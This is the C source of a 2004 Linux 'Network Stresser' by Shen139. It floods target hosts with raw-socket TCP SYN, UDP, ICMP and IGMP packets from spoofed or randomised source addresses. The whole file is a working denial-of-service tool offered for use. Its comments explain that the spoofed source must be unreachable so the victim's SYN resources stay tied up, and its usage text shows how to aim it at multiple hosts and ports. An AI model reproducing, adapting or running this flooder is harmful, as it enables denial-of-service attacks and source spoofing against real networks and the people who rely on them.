/*

	Network Stresser v0.5t (Linux)

	Copyright 2004 Shen139 <shen139(at)eviltime(dot)com>


 Compile with: gcc stresser-0.5.c -o stresser -lpthread 

*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/igmp.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <pthread.h>
#include "checksum.h"

#define VERSION			"0.5t"
#define MAXHOSTIP		20
#define MAXHOSTLENGHT		20
#define MAXPORTS		MAXHOSTIP

pthread_t IDthread[4];		//A thread 4 each protocol
pthread_t IDthrdWait;
pthread_mutex_t shit = 		PTHREAD_MUTEX_INITIALIZER;
void  usage			(char*);
void *fWait			(void *);
void  sigdie			(int);
void  onalarm			(/*nothing*/);
int   CompileIPhdr		(struct iphdr* ,char* ,char* ,int ,int);
int   ResolveHostIP		(char* ,char vet1[][] ,int* ,char vet2[][] ,int*);
void  RandomIP			(char *);
int   SeparateComma		(char *, int ,char vet[][] ,int *);
void *StressTCP			(/*nothing*/);
void *StressUDP			(/*nothing*/);
void *StressICMP		(/*nothing*/);
void *StressIGMP		(/*nothing*/);
int   SendTCPacket		(char*, char*, int, int);
int   SendUDPacket		(char*, char*, int, int);
int   SendICMPacket		(char*, char*);
int   SendIGMPacket		(char*, char*, int, int);

struct listofip
{
	char mIP[4][2][MAXHOSTIP][MAXHOSTLENGHT];
	int bound[4][2];
	int ports[2][MAXPORTS];
}ltp;

int iStop=1,
		SeedB=0,
					iTime=1;

int main(int argc, char *argv[])
{
char vet[MAXHOSTIP][MAXHOSTLENGHT];
int i,c,n;
extern int optind;

	printf("+ Shen139's Network Stresser v%s\n",VERSION);
	printf("  - Coded by Shen139\n");
	printf("  - shen139(at)eviltime(dot)com\n");

	if(argc==1)
		usage(argv[0]);

	if(getuid())
	{
		fprintf(stderr, "- You must be root to run this program!\n" );
		return (0);
	}

	memset(&ltp,0,sizeof(ltp));
	
	while ((c = getopt(argc, argv, "situgh?")) != -1)
		switch (c)
		{
		case 's':		//second(s)
			if(argc<=3)	//Only time?!?
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			iTime=atoi(argv[optind]);
			
			if (iTime==0) iTime=1;

			break;

		case 'i':		//ICMP
			if(argc-1<optind)
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			printf("\n+  Resolving ICMP hostnames...");
			if(ResolveHostIP(argv[optind], ltp.mIP[2][0], &ltp.bound[2][0], ltp.mIP[2][1], &ltp.bound[2][1]))
			{
				printf("-  Errors in arguments\n");
				return 0;
			}

			break;

		case 't':		//TCP
			if(argc-1<optind+1)
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			printf("\n+  Resolving TCP hostnames...");
			if(ResolveHostIP(argv[optind], ltp.mIP[0][0], &ltp.bound[0][0], ltp.mIP[0][1], &ltp.bound[0][1]))
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			SeparateComma(argv[optind+1], strlen(argv[optind+1]),vet, &n);

			memset(ltp.ports[0],0,sizeof(ltp.ports[0]));
			printf("\n+   TCP Port(s):");
			for( i=0;i<n;i++)
			{
				ltp.ports[0][i]=atoi(vet[i]);
				if(ltp.ports[0][i]==0)
				{
					printf("\n-  Errors in arguments\n");
					return 0;
				}

				printf("\n    - %i",ltp.ports[0][i]);
			}
			break;

		case 'u':		//UDP
			if(argc-1<optind+1)
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			printf("\n+  Resolving UDP hostnames...");
			if(ResolveHostIP(argv[optind], ltp.mIP[1][0], &ltp.bound[1][0], ltp.mIP[1][1], &ltp.bound[1][1]))
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			printf("\n+   UDP Port(s):");
			SeparateComma(argv[optind+1], strlen(argv[optind+1]),vet, &n);

			memset(ltp.ports[1],0,sizeof(ltp.ports[1]));
			
			for(i=0;i<n;i++)
			{
				ltp.ports[1][i]=atoi(vet[i]);
				if(ltp.ports[1][i]==0)
				{
					printf("\n-  Errors in arguments\n");
					return 0;
				}
				printf("\n    - %i",ltp.ports[1][i]);
			}
			break;

		case 'g':		//IGMP
			if(argc-1<optind)
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			printf("\n+  Resolving IGMP hostnames...");
			if(ResolveHostIP(argv[optind], ltp.mIP[3][0], &ltp.bound[3][0], ltp.mIP[3][1], &ltp.bound[3][1]))
			{
				printf("-  Errors in arguments\n");
				return 0;
			}
			break;

		case 'h':
		case '?':
		default:
			usage(argv[0]);
		}

	printf("\n+  Stressing...(for %i second(s))\n",iTime);

	for(i=1;i<=4;i++)
	{
		//what is it?!? :-)) 
		if(ltp.bound[i-1][0] && ltp.bound[i-1][1])
			if(pthread_create(&IDthread[i-1], NULL, 
				(i==1) ? (void*)StressTCP : 
				(i==2) ? (void*)StressUDP : 
				(i==3) ? (void*)StressICMP : 
					 (void*)StressIGMP, NULL)!=0)
			{
				printf("-    Thread error:\n");
				perror("+    pthread_create() ");
				exit(0);
			}
	}

	if(pthread_create(&IDthrdWait, NULL, fWait, NULL)!=0)
	{
		printf("-    Thread error:\n");
		perror("+    pthread_create() ");
		exit(0);
	}

	for(i=4;i>=0;i--)
	{
		if(ltp.bound[i-1][0] && ltp.bound[i-1][1])
		{
			pthread_join(IDthread[i-1], NULL);	//Wait 4 child thread
		}
	}

	printf("- Stressing complete\n");

exit(0);
}

void usage(char* arg0)
{
	printf("\n + Usage:\n");
	printf("  -s Numbers of seconds the stresser will flood (default: 10)\n");
	printf("  -t (TCP SYN flood)	* - port(s)\n");
	printf("  -u (UDP flood)	* - port(s)\n");
	printf("  -i (ICMP flood)	*\n");
	printf("  -g (IGMP flood)	*\n");
	printf(" * -> host(s)/IPs of the source:host(s)/IPs of the dest separated by comma and without spaces\n");
	printf("\n + Examples:\n");
	printf("  - %s -i IP1,HOST2,HOST3:IP4,IP5 -g IP4,HOST2,IP6:IP7,IP1,HOST2\n",arg0);
	printf("  - %s -t IP1,IP2,HOST3:HOST4,IP5 PORT1,PORT2,PORT3 -u IP6,HOST3:IP7 PORT4,PORT5\n",arg0);
	printf("  - %s -t IP1,RANDOM:HOST4,IP2 PORT1,PORT2,PORT3 -i IP3,HOST1:RANDOM,IP7 PORT4,PORT5\n",arg0);
	printf("  - ** RANDOM generates random IP (new)\n");

exit(0);
}

void sigdie(int signo)
{
	//Only a thread must execute this code
	pthread_mutex_lock(&shit);

	//Nmap rulez :D
	switch(signo)
	{
	case SIGINT:
		fprintf(stderr, "- Caught SIGINT signal, cleaning up\n");
	break;
	case SIGTERM:
		fprintf(stderr, "- Caught SIGTERM signal, cleaning up\n");
	break;
	case SIGHUP:
		fprintf(stderr, "- Caught SIGHUP signal, cleaning up\n");
	break;
	default:
		fprintf(stderr, "- Caught signal %d, cleaning up\n", signo);
	break;
	}
	
exit(0);

//	pthread_mutex_unlock(&shit);
}

void onalarm()
{
	iStop=0;
return ;
}

void *fWait(void *arg)
{
	signal(SIGINT,  sigdie);
	signal(SIGHUP,  sigdie);
	signal(SIGTERM, sigdie);
	signal(SIGALRM,onalarm);
	alarm(iTime);
	while(iStop){/*__asm__ __volatile__ ("nop\n");*/}

pthread_exit(0);
}

int CompileIPhdr(struct iphdr* ip,char* sAddr, char* dAddr,int protocol,int ID)
{
	//See rfc at: http://www.networksorcery.com/enp/protocol/ip.htm
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons(40);
	ip->id = ID;
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = protocol;
	ip->saddr = inet_addr(sAddr);
	ip->daddr = inet_addr(dAddr);
	ip->check  = ip_fast_csum((unsigned char *)&ip, ip->ihl);
return 1;
}

void RandomIP(char *buffer)
{
	if(SeedB>1000)
		SeedB=0;

	srand(time(NULL)+SeedB++);
	sprintf(buffer,"%i.%i.%i.%i"	,70+(int) (90.0*rand()/(RAND_MAX+1.0))
					,1+(int) (255.0*rand()/(RAND_MAX+1.0))
					,1+(int) (255.0*rand()/(RAND_MAX+1.0))
					,1+(int) (255.0*rand()/(RAND_MAX+1.0)));
return;
}

int SeparateComma(char *argv, int nc2s, char vet[MAXHOSTIP][MAXHOSTLENGHT], int *n)
{
int i,r=0,c=0;
char szTmp[MAXHOSTLENGHT];


	for(i=0;i<=nc2s;i++)
	{

		if(r>MAXHOSTIP)
			return 1;

		szTmp[c]=argv[i];
		c++;
		if(argv[i]==',')
		{
			szTmp[c-1]=0;
			c=0;
			strcpy(vet[r],szTmp);
			r++;
		}
	}
	szTmp[c-1]=0;
	c=0;
	strcpy(vet[r],szTmp);
	*n=r+1;
return (1);
}

int ResolveHostIP(char* argv, char vet1[MAXHOSTIP][MAXHOSTLENGHT], int* n1, char vet2[MAXHOSTIP][MAXHOSTLENGHT], int* n2)
{

int i,c=0,nC;
struct _sTmp
{
	char szTmp[MAXHOSTIP][MAXHOSTLENGHT];
}*sTmp;
struct hostent*hp;

	memset(vet1,0,sizeof(vet1));
	memset(vet2,0,sizeof(vet2));

	for(nC=0;nC<=strlen(argv);nC++)
		if(argv[nC]==':')
			break;
	if(strlen(argv)-nC<6)
	{
		return 1;
	}

	SeparateComma(argv,nC,vet1,n1);
	SeparateComma(argv+nC+1,strlen(argv)-nC-1,vet2,n2);

	for(c=0;c<2;c++)
	{
		if(c==0)
			(char**)sTmp=vet1;
		else
		{
			(char**)sTmp=vet2;
			n1=n2;
		}

		for(i=0;i<*n1;i++)
		{
			if(strcmp(sTmp->szTmp[i],"RANDOM")==0)
			{
				printf("\n   - Random ip");
				continue;
			}
			printf("\n   - Resolving %s",sTmp->szTmp[i]);

			hp=gethostbyname(sTmp->szTmp[i]);
			if(hp!=NULL)
			{
				strncpy(sTmp->szTmp[i],inet_ntoa(*(struct in_addr *)hp->h_addr),sizeof(sTmp->szTmp[i]));
				printf(" -> %s\t\t[  OK  ]",inet_ntoa(*(struct in_addr *)hp->h_addr));
			}
			else
			{
				printf("\t\t\t[ERROR ]\n");
				exit(0);
			}
		}
	}

return 0;
}

void *StressTCP()
{
int is=0,id=0,i_p=0,ID;
char tmpSIP[16],tmpDIP[16];
int nPack=0;

	ID=getpid();
	while(iStop)
	{
		strncpy(tmpSIP,ltp.mIP[0][0][is],16); 
		strncpy(tmpDIP,ltp.mIP[0][1][is],16); 
		if(strcmp(ltp.mIP[0][0][is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.mIP[0][1][id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		SendTCPacket(tmpSIP,tmpDIP,ltp.ports[0][i_p],ID);
		
		is++; id++; i_p++;
		if(ltp.mIP[0][0][is][0]==0)
			is=0;
		if(ltp.mIP[0][1][id][0]==0)
			id=0;
		if(!ltp.ports[0][i_p])
			i_p=0;

	//The source ip must be down otherwise when the client recives the syn/ack flags
	//will replay with a rst flag and the server will free all the resources allocated!
	//English rulez :D
		ID++;
		nPack++;
	}
	printf("   - TCP packet sent:\t%i\n",nPack);

pthread_exit(0);
}

void *StressUDP()
{
int is=0,id=0,i_p=0,ID;
char tmpSIP[16],tmpDIP[16];
int nPack=0;

	ID=getpid();
	while(iStop)
	{
		strncpy(tmpSIP,ltp.mIP[1][0][is],16); 
		strncpy(tmpDIP,ltp.mIP[1][1][is],16); 
		if(strcmp(ltp.mIP[1][0][is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.mIP[1][1][id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		SendUDPacket(tmpSIP,tmpDIP,ltp.ports[1][i_p],ID);
		is++; id++; i_p++;
		if(ltp.mIP[1][0][is][0]==0)
			is=0;
		if(ltp.mIP[1][1][id][0]==0)
			id=0;
		if(!ltp.ports[1][i_p])
			i_p=0;
		ID++;
		nPack++;
	}
	printf("   - UDP packet sent:\t%i\n",nPack);

pthread_exit(0);
}

void *StressICMP()
{
int is=0,id=0;
char tmpSIP[16],tmpDIP[16];
int nPack=0;

	while(iStop)
	{
		strncpy(tmpSIP,ltp.mIP[2][0][is],16); 
		strncpy(tmpDIP,ltp.mIP[2][1][is],16); 
		if(strcmp(ltp.mIP[2][0][is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.mIP[2][1][id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		SendICMPacket(tmpSIP,tmpDIP);

		is++; id++;
		if(ltp.mIP[2][0][is][0]==0)
			is=0;
		if(ltp.mIP[2][1][id][0]==0)
			id=0;
		nPack++;
	}
	printf("   - ICMP packet sent:\t%i\n",nPack);

pthread_exit(0);
}

void *StressIGMP()
{
int is=0,id=0;
char tmpSIP[16],tmpDIP[16];
int nPack=0;

	while(iStop)
	{
		strncpy(tmpSIP,ltp.mIP[3][0][is],16); 
		strncpy(tmpDIP,ltp.mIP[3][1][is],16); 
		if(strcmp(ltp.mIP[3][0][is],"RANDOM")==0)	
			RandomIP(tmpSIP); 
		if(strcmp(ltp.mIP[3][1][id],"RANDOM")==0) 
			RandomIP(tmpDIP);

		//Type: 0x11 Membership query
		SendIGMPacket(tmpSIP,tmpDIP,0x11,0);
		is++; id++;
		if(ltp.mIP[3][0][is][0]==0)
			is=0;
		if(ltp.mIP[3][1][id][0]==0)
			id=0;

		nPack++;
	}
	printf("   - IGMP packet sent:\t%i\n",nPack);

pthread_exit(0);
}

int SendICMPacket(char *soAddr,char *dAddr)
{

struct iphdr ip;
struct icmphdr icmp;
u_char *packet;
struct sockaddr_in saddr;
int sock,optv=1;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct icmp));
	memset(packet,0,sizeof(packet));
	memset(&icmp,0,sizeof(icmp));
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(1);
	saddr.sin_addr.s_addr = inet_addr(soAddr);

	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
	{
		fprintf(stderr,"+  ICMP packet error\n");
		perror("   - Socket() ");
		return 0;
	}
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)optv,optv);

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_ICMP,getpid());
	memcpy(packet,&ip,sizeof(ip));

	//See rfc at: http://www.networksorcery.com/enp/protocol/icmp.htm

	memset(&icmp,0,sizeof(icmp));
	icmp.type = ICMP_ECHO;
	icmp.checksum = 0xfff7;

	memcpy(packet + sizeof(struct iphdr), &icmp, sizeof(icmp));

	if(sendto(sock, packet, sizeof(struct iphdr)+sizeof(struct icmphdr), 0, (struct sockaddr*)&saddr, sizeof(saddr))==-1)

	{
		fprintf(stderr,"+  ICMP packet error\n");
		perror("   - sendto() ");
		fprintf(stderr,"   + Debug:\n    - Source Address: %s\n    - Destination Address: %s\n",soAddr,dAddr);
		return 0;
	}
	close(sock);
	return 1;
}

int SendIGMPacket(char *soAddr,char *dAddr,int igmpType,int igmpRoutinCode)
{

struct iphdr ip;
struct igmp igmp;
u_char *packet;
struct sockaddr_in saddr;
int sock,optv=1;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct igmp));
	memset(packet,0,sizeof(packet));
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(1);
	saddr.sin_addr.s_addr = inet_addr(soAddr);

	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
	{
		fprintf(stderr,"+  IGMP packet error\n");
		perror("   - Socket() ");
		return 0;
	}
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)optv,optv);

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_IGMP,getuid());
	memcpy(packet,&ip,sizeof(ip));

	//See rfc at: http://www.networksorcery.com/enp/protocol/igmp.htm
	igmp.igmp_type=igmpType;
	igmp.igmp_code=igmpRoutinCode;
	igmp.igmp_cksum=0;
	igmp.igmp_cksum = in_cksum((u_short *)&igmp, sizeof(struct igmp));

	memcpy(packet + sizeof(struct iphdr), &igmp, sizeof(struct igmp));


	if(sendto(sock, packet, sizeof(struct iphdr)+sizeof(struct igmp), 0, (struct sockaddr*)&saddr, sizeof(saddr))==-1)
	{
		fprintf(stderr,"+  IGMP packet error\n");
		perror("   - sendto() ");
		fprintf(stderr,"   + Debug:\n    - Source Address: %s\n    - Destination Address: %s\n",soAddr,dAddr);
		return 0;
	}
	close(sock);
	return 1;
}

int SendTCPacket(char *soAddr,char *dAddr,int port,int ID)
{
struct iphdr ip;
struct tcphdr tcp;
u_char *packet;
struct psd_tcp psdtcp;
struct sockaddr_in saddr;
int sock,optv=1;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct tcphdr));

	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	saddr.sin_addr.s_addr = inet_addr(soAddr);

	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
	{
		fprintf(stderr,"+  TCP packet error\n");
		perror("   - Socket() ");
		return 0;
	}
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)optv,optv);

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_TCP,ID);

	memcpy(packet,&ip,sizeof(ip));

	//See rfc at: http://www.networksorcery.com/enp/protocol/tcp.htm
	tcp.source = rand()*1000;
	tcp.dest   = htons(port);
	tcp.seq = ID;
	tcp.ack_seq = 0;
	tcp.res1 = 0;
	tcp.doff = 5;
	tcp.fin  = 0;
	tcp.syn  = 1;
	tcp.rst  = 0;
	tcp.psh  = 0;
	tcp.ack  = 0;
	tcp.urg  = 0;
	tcp.res2 = 0;
	tcp.window = htons(32767);
	tcp.urg_ptr = 0;
	tcp.check = 0;
	psdtcp.src.s_addr=ip.saddr;
	psdtcp.dst.s_addr=ip.daddr;
	psdtcp.pad=0;
	psdtcp.proto=IPPROTO_TCP;
	psdtcp.tcp_len=htons(sizeof(tcp));

	memcpy(&psdtcp.tcp,&tcp,sizeof(tcp));

	tcp.check = in_cksum((unsigned short *)&psdtcp, sizeof(psdtcp));
	memcpy(packet + sizeof(struct iphdr), &tcp, sizeof(tcp));

	if(sendto(sock, packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr*)&saddr, sizeof(saddr))==-1)
	{
		fprintf(stderr,"+  TCP packet error\n");
		perror("   - sendto() ");
		fprintf(stderr,"   + Debug:\n    - Port: %i\n    - Source Address: %s\n    - Destination Address: %s\n",port,soAddr,dAddr);
		return 0;
	}

	close(sock);
	return 1;
}

int SendUDPacket(char *soAddr,char *dAddr,int port,int ID)
{
struct iphdr ip;
struct udphdr udp;
u_char *packet;
struct psd_udp psdudp;
struct sockaddr_in saddr;
int sock,optv=1;

	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct udphdr));

	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	saddr.sin_addr.s_addr = inet_addr(soAddr);

	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
	{
		fprintf(stderr,"+  UDP packet error\n");
		perror("   - Socket() ");
		//return 0;
		return 1;
	}
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)optv,optv);

	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_UDP,ID);
	memcpy(packet,&ip,sizeof(ip));

	//See rfc at: http://www.networksorcery.com/enp/protocol/udp.htm
	udp.len = htons(sizeof(udp));
	udp.dest = htons(port);
	udp.source = htons(port);
	udp.check=0;

	psdudp.src.s_addr=ip.saddr;
	psdudp.dst.s_addr=ip.daddr;
	psdudp.pad=0;
	psdudp.proto=IPPROTO_UDP;
	psdudp.udp_len=htons(sizeof(udp));

	memcpy(&psdudp.udp,&udp,sizeof(udp));

	udp.check = in_cksum((unsigned short *)&psdudp, sizeof(psdudp));

	memcpy(packet + sizeof(struct iphdr), &udp, sizeof(udp));
	if(sendto(sock, packet, sizeof(struct iphdr)+sizeof(struct udphdr), 0, (struct sockaddr*)&saddr, sizeof(saddr))==-1)
	{
		fprintf(stderr,"+  UDP packet error\n");
		perror("   - sendto() ");
		fprintf(stderr,"   + Debug:\n    - Port: %i\n    - Source Address: %s\n    - Destination Address: %s\n",port,soAddr,dAddr);
		//return 0;
		return 1;
	}

	close(sock);
	return 1;
}

